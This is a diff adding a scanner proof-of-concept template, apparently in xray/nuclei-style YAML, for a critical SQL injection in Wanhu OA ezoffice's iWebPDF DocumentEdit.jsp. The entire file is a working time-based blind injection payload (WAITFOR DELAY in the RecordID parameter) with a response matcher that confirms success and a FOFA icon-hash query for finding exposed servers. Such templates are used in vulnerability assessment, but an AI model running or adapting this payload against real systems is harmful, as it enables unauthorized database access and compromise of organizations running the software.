@@ -1,0 +1,23 @@
+id: poc-yaml-wanhu-oa-iwebpdf-documentedit-sqli
+info:
+  name: 万户OA-iWebPDF-DocumentEdit注入
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: icon_hash="-1827521324"
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /defaultroot/public/iWebPDF/DocumentEdit.jsp;?RecordID=1';WAITFOR%20DELAY%20'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(body,"rootPath:\"/defaultroot") &&
+
+    contains(headers,"text/html") &&
+
+    duration > t1
+
+    '
+transport: http
